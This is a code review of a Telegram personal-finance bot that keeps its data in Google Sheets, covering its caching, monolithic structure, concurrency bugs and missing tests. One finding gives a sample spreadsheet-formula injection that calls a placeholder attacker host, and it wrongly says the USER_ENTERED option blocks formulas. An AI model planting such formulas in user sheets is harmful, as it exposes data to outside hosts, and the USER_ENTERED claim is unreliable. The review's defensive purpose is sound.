# ACM Wallet Code Review — June 25, 2026

**File:** `/root/ACM-Personal-Wallet/bot/main.py`
**Size:** 5,964 lines, ~246 KB
**Bot:** ACM Personal Wallet — Telegram finance tracking bot using Google Sheets as backend

---

## Overall Score: 6.5/10

A feature-rich finance bot with strong functional completeness, good caching design, and solid resilience patterns. Severely held back by being a single monolithic 6,000-line file with significant code duplication, no test coverage, and fragile state management.

---

## Strengths (✅)

- ✅ **Rich feature set** — 30+ commands covering transactions, accounts, net worth, currency conversion, budget tracking, reminders, SaaS tracking, project P&L, cashflow trends, month comparison, forecast, debt management, borrow/lend, settle, and asset purchases. One of the most complete finance bots I've seen.

- ✅ **Well-designed caching layer** (lines ~260-310, 320-360) — Multi-level cache with configurable TTLs: `SETTINGS_CACHE_TTL=300s`, `ACCT_CACHE_TTL=300s`, `TX_ROWS_CACHE_TTL=120s`, `OPENING_CACHE_TTL=600s`. Cache invalidation is explicit (`invalidate_all_caches()`) after every write, preventing stale reads.

- ✅ **Background cache warmer** (lines ~5880-5920) — Daemon thread pre-warms settings, account balances, tx rows, opening balances, FX rates, and monthly summary every 90 seconds. Replaces external n8n cron — clever.

- ✅ **Google Sheets safety discipline** (lines ~185-200, 530-610) — Uses `update_cells()` with explicit `gspread.Cell` objects to avoid accidentally clearing ARRAYFORMULA columns. Never touches cols A(1), C(3), D(4), K(11), L(12), M(13). This is a well-thought-out pattern that prevents data corruption.

- ✅ **Self-healing architecture** (lines ~5930-5970) — `while True` loop with 5-second retry, `flock` single-instance guard, `drop_pending_updates=True` on restart, and socket timeout (15s) + asyncio timeout (25s) layered defense. Very robust against transient failures.

- ✅ **Good date parsing** (lines ~660-740) — Handles 5+ date formats plus Google Sheets date serials (`_GSHEET_EPOCH`). Tries col D (ARRAYFORMULA month prefix) first for fast matching, falls back to full date parse.

- ✅ **Amount parser** (lines ~1470-1500) — Supports multiple shorthand notations: `k`, `jt`/`juta`, `m`, `b`/`bn`, `rb`/`ribu`, currency symbols (`$`, `฿`). Great for SE Asian user base.

- ✅ **Responsive UX** (line ~2770) — Sends `"⏳"` acknowledgement immediately before any Google Sheets call so users see instant feedback.

- ✅ **Retry decorator** (lines ~235-255) — `_gsheet_retry` with exponential backoff (1s→2s→4s) for transient errors (429, quota, timeout, 502, 503). Non-transient errors fail fast.

- ✅ **Budget alerts** (lines ~2900-2960) — Automatic alert after every expense transaction: >80% warning, >100% over-budget alert. Well-executed.

- ✅ **Good error messages** (lines ~390-420) — `_err()` helper categorizes errors by type (quota, permission, not found, timeout) and gives actionable hints.

- ✅ **Authorization decorator** (lines ~198-216) — Simple but effective; blocks unauthorized users at the handler level. Works for both command handlers and conversation entry points.

---

## Weaknesses (⚠️)

- ⚠️ **Monolithic 6,000-line single file** (entire file) — This is the single biggest issue. A file this large is hard to navigate, review, test, and maintain. Should be split into at minimum: `sheets.py` (data layer), `handlers/` (command handlers), `conversations/` (multi-step flows), `utils.py` (helpers), and `bot.py` (app factory). **Severity: HIGH**

- ⚠️ **Massive code duplication** (lines ~3600-3800 vs ~2500-2700 vs ~3800-4100 vs ~4100-4400 vs ~4400-4560) — The borrow/lend/buyasset/settle flows share ~80% identical structure (load OB → pick person → enter amount → pick account → save transaction + OB + invalidate). Would benefit from a generic "compound transaction" abstraction. `expense_receive_amount` (line ~5501) duplicates the hint-matching logic from `tx_receive_amount` (line ~2730) almost verbatim.

- ⚠️ **Inline category-matching code duplicated 3 times** (lines ~1560-1590, ~5501-5560, ~5561-5620) — The "try exact match, then partial match, then word-split match" for category hints appears in `_find_category_match()`, `cmd_expense()`, and `expense_receive_amount()`. The latter two reimplement the first's logic.

- ⚠️ **No type hints on most function signatures** — While `dict` return types are used on data layer functions, most handler functions lack type annotations completely (e.g., `async def tx_cb_scope(update, context)`). This loses IDE autocomplete and static analysis benefits.

- ⚠️ **No test coverage whatsoever** — Zero unit tests, zero integration tests. A 6,000-line financial bot with no tests is a significant risk. Every change risks breaking existing flows silently.

- ⚠️ **Google Sheets API calls on the main thread blockers** — While `_sh()` wraps calls in `asyncio.to_thread()`, the sequential nature of conversation handlers means each step waits for a Sheets API round-trip. During peak usage with multiple concurrent users, sheet rate limits could cause cascading delays.

- ⚠️ **PicklePersistence only for bot_data** (lines ~5640-5645) — Conversation states are NOT persisted (`user_data=False`). While the comment explains this is intentional to avoid stuck states, it means in-progress transaction flows are lost on bot restart. A hybrid approach (persisting with TTL) would be better.

- ⚠️ **No rate limiting on user actions** — A malicious or accidental user could trigger dozens of sheet writes rapidly through repeated transactions. The `_gsheet_retry` handles reading retries, but writes have no throttling.

- ⚠️ **ConversationHandler timeout is uniform 600s** — All 8 conversation handlers use the same 600s timeout. Some flows (transfer with FX rate step) might reasonably take longer; others (quick expense) should timeout faster.

- ⚠️ **Callback query error handling inconsistent** — Some handlers use `await q.answer()` as the first line, others don't. Missing `q.answer()` can cause the "loading" spinner to persist indefinitely on the Telegram client. (Example: `cb_quickstart` at line ~1800 does answer first, but `settle_cb_type` at line ~3900 does not in some paths.)

- ⚠️ **`parse_amount` is called synchronously in handlers** (line ~1470) — The function uses `re.compile` at module level which is fine, but if inputs get very large or malformed, there's no timeout guard. Minor concern.

- ⚠️ **No structured logging or metrics** — Logging uses standard Python `logging` which is fine, but there are no metrics for: sheet API latency, cache hit ratio, error rate by type, user activity counts. Hard to monitor health without these.

---

## Critical Issues (🔴)

- 🔴 **No input sanitization for Google Sheets** — User-provided text (account names, project names, categories) is written directly to Google Sheets without sanitization. While the `USER_ENTERED` value option prevents formula injection execution, a user could type `=IMPORTDATA("https://evil.com/data")` as a "project name" which would render as a formula in the sheet UI. The fix is to prefix user-entered values that start with `=`, `+`, `-`, or `@` with a single quote.

- 🔴 **`save_transfer` is synchronous (not in thread pool)** — At line ~3100 (`save_transfer(from_acc, to_acc, amount)`), the same-currency transfer path calls `save_transfer()` directly without `await _sh(...)`. Compare with line ~3170 where the cross-currency path correctly uses `await update.message.reply_text(...)` then calls `save_transfer()` synchronously *in a MessageHandler context*. The `xfer_cb_to` handler calls `save_transfer` directly in a `CallbackQueryHandler` — this blocks the event loop during the Sheets API call. The fix: `await _sh(save_transfer, from_acc, to_acc, amount)`.

- 🔴 **`find_last_tx_row()` reversed iteration + `_is_data_row()` could miss rows** — At line ~1070, `reversed(all_rows)` iterates the full sheet. `_is_data_row()` at line ~950 checks col B for a string that's not "date" and col I for a parseable amount. If someone hand-edits a row and accidentally clears col B, `_is_data_row` returns `False` for what might be the actual last data row. The `find_last_tx_row` would then pick an older row — `edit` and `delete` would target the wrong transaction.

- 🔴 **Race condition on `save_transaction` row detection** — At line ~550, `col_b = sheet.col_values(2)` then `row_number = len(col_b) + 1` is used to find the next empty row. If another handler writes a row between the `col_values` call and `update_cells`, two transactions will be written to the same row (the second overwrites the first). The window is small (a few hundred ms) but real under concurrent usage. Google Sheets doesn't support atomic append.

- 🔴 **`delete_rows(rn)` (line ~2610) doesn't invalidate ARRAYFORMULA references** — Deleting a row in Google Sheets via `delete_rows(rn)` physically removes it and shifts rows up. Any ARRAYFORMULA references to absolute cell positions below the deleted row remain correct (Google Sheets handles this), but `_parse_row_date` relies on row order. No actual data corruption, but the mental model is fragile — worth documenting.

- 🔴 **Budget/reminder data stored only in `bot_data`** — `PicklePersistence` saves `bot_data` to disk, but if the pickle file gets corrupted (power loss during write, disk full), all budget and reminder settings for ALL users are lost. There's no backup mechanism for this data. Consider also writing to a dedicated sheet or separate JSON backup.

---

## Recommendations

### HIGH Priority

| # | Issue | Effort | Fix |
|---|-------|--------|-----|
| 1 | Split 6,000-line monolith into modules | **Large** (~4-6h) | Create `sheets/`, `handlers/`, `conversations/`, `utils/` packages. Extract each ConversationHandler into its own file. |
| 2 | Add formula injection sanitization | **Small** (~30m) | Add `_sanitize_cell(value)` that prefixes `=`, `+`, `-`, `@` with `'`. Call before all sheet writes. |
| 3 | Fix `save_transfer` blocking event loop | **Small** (~15m) | Replace `save_transfer(...)` with `await _sh(save_transfer, ...)` at line ~3100 in `xfer_cb_to`. |
| 4 | Add tests for critical paths | **Large** (~8-12h) | At minimum: tests for `parse_amount`, `_parse_row_date`, `_is_data_row`, `get_monthly_summary` calculations, `get_account_balances` aggregation. Mock `gspread` client. |

### MEDIUM Priority

| # | Issue | Effort | Fix |
|---|-------|--------|-----|
| 5 | Eliminate duplicated hint-matching code | **Medium** (~1h) | Have `cmd_expense` and `expense_receive_amount` both call `_find_category_match()` for personal categories filtered subset. |
| 6 | Create compound-transaction abstraction | **Medium** (~3h) | Generic flow for "write to OB + write to Transaction_Log" used by borrow/lend/settle/buyasset. |
| 7 | Add proper type hints | **Medium** (~2h) | Annotate all handler signatures, data layer return types, user_data dict shape as TypedDict. |
| 8 | Add write-rate throttling | **Small** (~30m) | Per-user cooldown (e.g., 2-second minimum between writes). Track last write timestamp in `user_data`. |
| 9 | Backup bot_data to Sheets | **Medium** (~1h) | Periodically sync budgets/reminders to a "Bot_Data" sheet as backup for pickle corruption. |

### LOW Priority

| # | Issue | Effort | Fix |
|---|-------|--------|-----|
| 10 | Differentiated conversation timeouts | **Small** (~30m) | Transfer: 900s, Quick expense: 300s, Others: 600s. |
| 11 | Add cache hit/miss metrics | **Small** (~30m) | Simple counters in `_sh()`, log every N minutes. |
| 12 | Add structured logging context | **Medium** (~1h) | Include `user_id`, `chat_id` in log records for debugging. |
| 13 | Document ARRAYFORMULA row-delete behavior | **Small** (~15m) | Add comment to `cb_delete` handler explaining Google Sheets row deletion mechanics. |

---

## Code Smells Found

| # | Location | Smell | Description |
|---|----------|-------|-------------|
| 1 | Entire file | **God File** | 5,964 lines in one file — cognitive overload for any maintainer |
| 2 | Lines 3630-3950 vs 3960-4300 | **Duplicate Code** | `borrow_*` and `lend_*` handlers are near mirror images (different types and category names) |
| 3 | Lines 4300-4560 | **Duplicate Code** | `buyasset_*` follows same 5-step pattern as borrow/lend |
| 4 | Lines 5501-5630 | **Duplicate Code** | `expense_receive_amount` repeats hint-matching from `_find_category_match` |
| 5 | Lines 1560-1590 | **Duplicate Code** | `_find_category_match` exists but `cmd_expense` reimplements the same logic |
| 6 | Lines 270-300 | **Global Mutable State** | 10+ module-level caches (`_settings_cache`, `_acct_cache`, `_monthly_cache`, etc.) — okay with GIL, but fragile for multi-process |
| 7 | Lines 110-160 | **Magic Numbers** | State constants use `range()` with gaps — fragile if reordered (e.g., `BUDGET_AMOUNT, BUDGET_CONFIRM = range(10, 12)` and `EXPENSE_AMT = 21`) |
| 8 | Lines 2250-2290 | **Long Function** | `cb_quickstart` is ~120 lines long handling 5 different actions in one handler |
| 9 | Lines 600-615 | **Helper Duplication** | `save_opening_balance` uses `append_row()` while `save_transaction` uses `update_cells()` — intentional but inconsistently documented |
| 10 | Lines ~4700-5000 | **Inline HTML in multi-line strings** | Many command handlers build HTML messages with manual string concatenation — error-prone for malformed HTML |

---

## Comparison with YYO Wallet

ACM Wallet currently has **feature parity or exceeds YYO Wallet** in these areas:

| Feature | YYO Wallet | ACM Wallet |
|---------|-----------|------------|
| Transaction logging | ✅ | ✅ |
| Monthly/weekly summaries | ✅ | ✅ |
| Budget tracking | ✅ | ✅ |
| Daily reminders | ✅ | ✅ |
| Multi-currency / FX | ❌ | ✅ (full FX converter + /setrate) |
| SaaS tracker | ❌ | ✅ |
| Project P&L | ❌ | ✅ |
| Month comparison | ❌ | ✅ (/compare) |
| Forecast | ❌ | ✅ (/forecast) |
| Borrow/Lend/Settle | ❌ | ✅ (full debt lifecycle) |
| Asset purchase | ❌ | ✅ (/buyasset) |
| Cashflow trend | ❌ | ✅ (5-month chart) |
| Business/Personal split | ❌ | ✅ (/split) |
| Net worth | ❌ | ✅ (/networth) |
| Photo receipt | ❌ | ✅ (/receipt with photo upload) |

ACM Wallet is functionally superior to YYO Wallet across the board.

**What ACM Wallet could still add:**
- Recurring transaction templates (e.g., monthly rent)
- Tag/note field on transactions (currently only project is tracked)
- Multi-user shared budgets (family/team mode)
- Export to PDF report (currently only CSV)
- Web dashboard (complement bot with a simple web UI)

---

## Summary

The ACM Personal Wallet bot is a **feature-complete, production-hardened finance tracker** with excellent attention to Google Sheets safety, caching strategy, and self-healing infrastructure. The 6,000-line monolith is the critical technical debt item — it makes the codebase disproportionately hard to maintain, test, and extend despite its strong internal patterns.

**Immediate action items:** (1) sanitize user input before sheet writes to prevent formula injection, (2) fix the synchronous `save_transfer` call in the balance transfer handler, (3) start splitting the monolith into modules — even just separating the data layer (`sheets.py`) and conversation handlers would dramatically improve maintainability.

**Bottom line:** 6.5/10. The bot works well and is clearly battle-tested in production. The code is internally consistent and follows good patterns throughout. The single-file architecture and lack of tests are the only things keeping this from being an 8/10 or higher.
